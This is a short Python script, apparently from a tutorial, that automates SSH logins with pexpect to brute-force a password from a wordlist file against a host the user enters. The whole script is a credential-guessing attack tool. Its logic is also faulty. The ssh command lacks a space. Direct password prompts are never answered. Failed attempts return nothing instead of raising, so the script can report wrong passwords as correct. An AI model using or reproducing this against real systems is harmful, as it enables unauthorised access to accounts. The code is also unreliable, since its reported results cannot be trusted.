#!/usr/bin/env python

'''This demonstrates using the connect method from sshlogin.py and modifying
it so that we can use a list of password from an external file to brute-force the 
SSH login.
'''


import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

# connect uses pexpect library to automate the ssh login and returns the ssh shell.
def connect(host, user, password):
  ssh_newkey = 'Are you sure you want to continue connecting'
  connectStr = 'ssh' + user + '@' + host
  child = pexpect.spawn(connectStr)
  ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword'])
  if ret == 0:
    print('[-]Error Connecting to Remote Host')
    return
  if ret == 1:
    child.sendline('yes')
    ret  = child.expect([pexpect.TIMEOUT, '[P|p]assword'])
    if ret == 0:
       print('[-]Error Connecting to Remote Host')
       return
    child.sendline(password)
    # Timeout makes sure that the prompt is returned before the function returns
    child.expect(PROMPT, timeout=0.5)
    return child

def main():
  host = input("Enter the host information: ")
  user = input("Enter your SSH username: ")
  password = input("Enter your SSH password: ")

  # password_file is the file where you'll place the password list for bruteforcing SSH login
  with open('password_file') as passwords:
    for password in passwords:
      password = password.strip('\n')
      try:
        child = connect(host, user, password)
        print(f'[+] Correct password: {password}')
      except:
         print(f'[+] Wrong password: {password}')


main()
